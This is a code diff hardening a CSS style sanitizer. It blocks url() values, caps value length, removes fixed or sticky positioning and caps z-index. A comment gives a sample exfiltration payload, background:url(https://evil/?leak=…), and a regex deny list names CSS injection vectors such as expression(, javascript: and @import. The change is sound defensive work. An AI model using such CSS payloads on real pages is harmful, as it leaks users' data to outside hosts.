@@ -23,8 +23,11 @@ function clean(v: unknown): string | number | undefined {
   if (typeof v !== 'string') return undefined;
   const s = v.trim();
   if (!s) return undefined;
+  if (s.length > 500) return undefined; // cap value length
   if (/[<>{};]/.test(s)) return undefined;
-  if (/expression\(|javascript:|vbscript:|@import/i.test(s)) return undefined;
+  // Block url() too: a CSS url() can exfiltrate to an external host (e.g.
+  // background:url(https://evil/?leak=…)). Images go through the image atom + safeImageSrc.
+  if (/expression\(|javascript:|vbscript:|@import|url\s*\(/i.test(s)) return undefined;
   return s;
 }
 
@@ -51,6 +54,13 @@ export function resolveStyle(style?: StyleProps): CSSProperties {
   const bg = clean(style.background);
   if (grad !== undefined) out.background = grad;
   else if (bg !== undefined) out.background = bg;
+  // Layout-hijack guards: no fixed/sticky positioning (overlay attacks); cap z-index.
+  if (out.position === 'fixed' || out.position === 'sticky') delete out.position;
+  if (out.zIndex !== undefined) {
+    const z = typeof out.zIndex === 'number' ? out.zIndex : parseInt(String(out.zIndex), 10);
+    if (!Number.isFinite(z)) delete out.zIndex;
+    else out.zIndex = Math.min(z, 9999);
+  }
   return out as CSSProperties;
 }
 
